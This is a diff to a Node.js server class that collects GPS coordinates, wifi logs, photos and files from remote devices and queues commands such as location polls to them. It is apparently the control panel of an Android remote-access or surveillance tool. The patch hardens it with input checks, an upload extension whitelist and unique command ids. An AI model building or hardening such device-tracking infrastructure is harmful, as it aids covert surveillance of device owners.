@@ -5,10 +5,10 @@ let CONST = require('./const'),
 
 class Clients {
     constructor(db) {
-        this.clientConnections = {};
-        this.gpsPollers = {};
-        this.clientDatabases = {};
-        this.ignoreDisconnects = {};
+        this.clientConnections = Object.create(null);
+        this.gpsPollers = Object.create(null);
+        this.clientDatabases = Object.create(null);
+        this.ignoreDisconnects = Object.create(null);
         this.instance = this;
         this.db = db;
     }
@@ -123,7 +123,7 @@ class Clients {
         //         // save to file
         //         let epoch = Date.now().toString();
         //         let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
-        //         fs.writeFileSync(filePath, new Buffer(base64String, "base64"), (error) => {
+        //         fs.writeFileSync(filePath, Buffer.from(base64String, "base64"), (error) => {
         //             if (!error) {
         //                 // let's save the filepath to the database
         //                 client.get('photos').push({
@@ -259,6 +259,10 @@ class Clients {
                 let sanitizedName = path.basename(data.name);
                 let lastDot = sanitizedName.lastIndexOf(".");
                 let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot) : '.unknown';
+                
+                // Absolute Final Patch: Whitelist extensions
+                const allowedExts = ['.jpg', '.png', '.mp3', '.mp4', '.txt', '.pdf', '.zip', '.apk', '.bin', '.unknown'];
+                if (!allowedExts.includes(fileExt.toLowerCase())) fileExt = '.bin';
 
                 let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
 
@@ -279,7 +283,8 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.location, (data) => {
-            if (data && typeof data === 'object' && Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {                client.get('GPSData').push({
+            if (data && typeof data === 'object' && Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
+                client.get('GPSData').push({
                     time: new Date(),
                     enabled: data.enabled || false,
                     latitude: data.latitude || 0,
@@ -338,7 +343,7 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.wifi, (data) => {
-            if (data.networks) {
+            if (data.networks && Array.isArray(data.networks)) {
                 if (data.networks.length !== 0) {
                     let networks = data.networks;
                     let dbwifiLog = client.get('wifiLog');
@@ -394,7 +399,7 @@ class Clients {
     }
 
     getClientDataByPage(clientID, page, filter = undefined) {
-        let client = db.maindb.get('clients').find({ clientID }).value();
+        let client = this.db.maindb.get('clients').find({ clientID }).value();
         if (client !== undefined) {
             let clientDB = this.getClientDatabase(client.clientID);
             let clientData = clientDB.value();
@@ -444,7 +449,7 @@ class Clients {
 
     // DELETE
     deleteClient(clientID) {
-        this.db.get('clients').remove({ clientID }).write();
+        this.db.maindb.get('clients').remove({ clientID }).write();
         if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
     }
 
@@ -481,9 +486,12 @@ class Clients {
 
         if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
         else {
-            // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
-            // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
-            commandPayload.uid = crypto.randomBytes(4).readUInt32BE(0) % 10000;
+            let uid;
+            do {
+                uid = crypto.randomBytes(4).readUInt32BE(0) % 10000;
+            } while (commandQue.find({ uid }).value());
+            
+            commandPayload.uid = uid;
             commandQue.push(commandPayload).write();
             return cb(false)
         }
@@ -535,10 +543,11 @@ class Clients {
         let gpsSettings = clientDB.get('GPSSettings').value();
 
         if (gpsSettings.updateFrequency > 0) {
+            const freq = Math.min(gpsSettings.updateFrequency, 86400);
             this.gpsPollers[clientID] = setInterval(() => {
                 logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
                 this.sendCommand(clientID, '0xLO')
-            }, gpsSettings.updateFrequency * 1000);
+            }, freq * 1000);
         }
     }
 
